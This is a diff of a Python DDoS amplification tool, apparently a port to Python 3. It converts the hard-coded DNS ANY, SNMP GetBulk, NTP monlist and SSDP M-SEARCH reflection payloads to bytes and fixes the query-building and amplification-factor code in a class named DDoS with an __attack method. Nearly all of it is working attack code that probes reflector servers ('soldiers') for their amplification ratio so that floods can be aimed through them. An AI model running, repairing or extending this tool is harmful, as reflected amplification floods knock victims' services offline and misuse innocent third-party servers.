@@ -58,16 +58,16 @@ PORT = {
 	'ssdp': 1900 }
 
 PAYLOAD = {
-	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
-			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
-			'\x00\x00\x00\x00\x00\x00'),
-	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
-		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
-		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
-		'\x01\x02\x01\x05\x00'),
-	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
-	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+	'dns': (b'{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
+			b'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
+			b'\x00\x00\x00\x00\x00\x00'),
+	'snmp':(b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
+		b'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
+		b'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
+		b'\x01\x02\x01\x05\x00'),
+	'ntp':(b'\x17\x00\x02\x2a'+b'\x00'*4),
+	'ssdp':(b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
+		b'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
 }
 
 amplification = {
@@ -140,7 +140,7 @@ def Monitor():
 			
 
 def AmpFactor(recvd, sent):
-	return '{}x ({}B -> {}B)'.format(recvd/sent, sent, recvd)
+	return '{}x ({}B -> {}B)'.format(recvd//sent, sent, recvd)
 
 def Benchmark(ddos):
 	print(BENCHMARK)
@@ -154,7 +154,7 @@ def Benchmark(ddos):
 					for domain in ddos.domains:
 						i+= 1
 						recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
-						if recvd/sent:
+						if recvd//sent:
 							print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
 								AmpFactor(recvd, sent), domain))
 						else:
@@ -192,7 +192,7 @@ class DDoS(object):
 		'''
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		sock.settimeout(2)
-		data = ''
+		data = b''
 		if proto in ['ntp', 'ssdp']:
 			packet = PAYLOAD[proto]
 			sock.sendto(packet, (soldier, PORT[proto]))
@@ -210,7 +210,7 @@ class DDoS(object):
 			sock.sendto(packet, (soldier, PORT[proto]))
 			data, _ = sock.recvfrom(65535)
 		except socket.timeout:
-			data = ''
+			data = b''
 		finally:
 			sock.close()
 		return len(data), len(packet)
@@ -221,15 +221,17 @@ class DDoS(object):
 			octet followed by that number of octets
 		'''
 		labels = domain.split('.')
-		QName = ''
+		QName = b''
 		for label in labels:
 			if len(label):
-				QName += struct.pack('B', len(label)) + label
+				QName += struct.pack('B', len(label)) + label.encode()
 		return QName
 	def __GetDnsQuery(self, domain):
 		id = struct.pack('H', randint(0, 65535))
 		QName = self.__GetQName(domain)
-		return PAYLOAD['dns'].format(id, QName)
+		template = PAYLOAD['dns']
+		parts = template.split(b'{}')
+		return parts[0] + id + parts[1] + QName + parts[2]
 	def __attack(self):
 		global npackets
 		global nbytes
